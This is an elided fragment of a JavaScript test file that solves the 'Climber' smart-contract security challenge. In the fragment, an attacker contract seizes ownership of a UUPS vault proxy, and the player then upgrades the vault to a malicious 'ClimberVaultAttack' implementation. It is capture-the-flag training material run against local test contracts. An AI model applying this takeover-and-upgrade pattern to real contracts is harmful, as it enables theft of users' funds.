...
describe('[Challenge] Climber', function () {
    ...
    before(async function () {
        ...
        vault = await upgrades.deployProxy(await ethers.getContractFactory('ClimberVault', deployer), [deployer.address, proposer.address, sweeper.address], {
            kind: 'uups',
        });
    ...
    it('Execution', async function () {
        ...
        await attacker.connect(player).getOwnership();
        console.log({
            player: player.address,
            vaultOwner: await vault.owner(),
        });
        // player is now the owner of the vault
        const vaultAttack = await (await ethers.getContractFactory('ClimberVaultAttack', player)).deploy();
        // console.log(vault.connect(player).upgradeTo);
        await vault.connect(player).upgradeTo(vaultAttack.address);
